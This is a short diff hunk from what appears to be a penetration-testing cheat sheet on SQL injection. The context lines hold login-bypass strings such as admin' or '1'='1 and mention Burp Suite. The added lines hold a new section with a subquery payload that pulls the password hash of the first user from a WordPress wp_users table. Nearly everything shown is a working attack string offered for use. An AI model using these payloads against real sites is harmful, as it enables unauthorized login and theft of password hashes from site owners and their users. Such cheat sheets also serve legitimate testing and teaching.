@@ -684,6 +684,15 @@ SQL INJECTION
 		admin' or '1'='1
 		%' or '0'='0
 		
+
+
+### Sql on wordpress site
+-------------------------
+Get password hash of user
+	(SELECT+user_pass+FROM+wp_users+WHERE+ID=1)
+
+
+
 ### Sql-login-bypass
 --------------------
 		- Open Burp-suite
